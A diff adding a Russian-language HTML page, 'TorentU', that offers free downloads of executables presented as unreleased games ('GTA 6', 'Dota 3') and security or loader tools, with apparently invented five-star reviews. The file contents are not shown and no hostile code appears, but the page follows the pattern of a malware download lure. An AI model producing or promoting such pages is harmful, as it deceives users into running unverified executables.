@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TorentU</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Intro:wght@300&display=swap');
+
+        body {
+            font-family: 'Intro', sans-serif;
+            background-color: #c8ffcb;
+            color: rgb(1, 61, 4);
+            text-align: center;
+            
+        }
+
+        h1 {
+            background-color: #55c957;
+            padding: 10px;
+            margin: 0;
+        }
+
+        .content {
+            margin-top: 20px;
+        }
+
+        .item {
+            margin-bottom: 10px;
+        }
+
+        .button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-top: 10px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+        }
+        
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        li {
+            background-color: #fff;
+            padding: 15px;
+            margin: 5px 0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        li:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+
+        .text {
+    font-size: 10px;
+}
+
+    </style>
+</head>
+<body>
+    <h1>Dota 3</h1>
+    <div class="content">
+        <a href="index.html" class="button">назад</a>
+    </div>
+    <br><br><br>
+    <div class="content">
+        <div class="text">Crossaut</div>
+        <button class="button" onclick="downloadFile1()">Скачать</button>
+    </div>
+    <div class="content">
+        <div class="text">360 Total Security</div>
+        <button class="button" onclick="downloadFile2()">Скачать</button>
+    </div>
+    <div class="content">
+        <div class="text">Telamor Cleaner</div>
+        <button class="button" onclick="downloadFile3()">Скачать</button>
+    </div>
+    <div class="content">
+        <div class="text">Yandex</div>
+        <button class="button" onclick="downloadFile4()">Скачать</button>
+    </div>
+    <div class="content">
+        <div class="text">WorldOfTanks</div>
+        <button class="button" onclick="downloadFile5()">Скачать</button>
+    </div>
+
+    <div class="content">
+        <div class="text">GTA 6</div>
+        <button class="button" onclick="downloadFile()">Скачать</button>
+    </div>
+    <div class="content">
+        <div class="text">GTA 6 mobile</div>
+        <button class="button" onclick="downloadFile6()">Скачать</button>
+    </div>
+<br><br><br>
+    <div class="content">
+        <div class="item">Отзывы</div>
+        <ol>
+            <li>★★★★★ Я в шоке, я думал что игра не вышла! Но она запустилась</li>
+            <li>★★★★☆ Норм, хорошая игра. Главное что бесплатно</li>
+            <li>★★★★★ я не хотел что нибудь писать просто 5 звезд</li>
+          </ol>
+    </div>
+
+    <script>
+        function downloadFile() {
+            var link = document.createElement('a');
+            link.href = 'GTA VI.py';  // Изменено на .exe
+            link.download = 'GTA VI.py';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function downloadFile1() {
+            var link = document.createElement('a');
+            link.href = 'Crossaut.exe';  // Изменено на .exe
+            link.download = 'Crossaut.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function downloadFile2() {
+            var link = document.createElement('a');
+            link.href = '360 Total Security.exe';  // Изменено на .exe
+            link.download = '360 Total Security.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        
+        function downloadFile3() {
+            var link = document.createElement('a');
+            link.href = 'Telamor Cleaner.exe';  // Изменено на .exe
+            link.download = 'Telamor Cleaner.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function downloadFile4() {
+            var link = document.createElement('a');
+            link.href = 'Yandex pack loader.exe';  // Изменено на .exe
+            link.download = 'Yandex pack loader.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function downloadFile5() {
+            var link = document.createElement('a');
+            link.href = 'World of Tanks.exe';  // Изменено на .exe
+            link.download = 'World of Tanks.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function downloadFile6() {
+            var link = document.createElement('a');
+            link.href = 'GTA VI mobile.apk';  // Изменено на .exe
+            link.download = 'GTA VI mobile.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
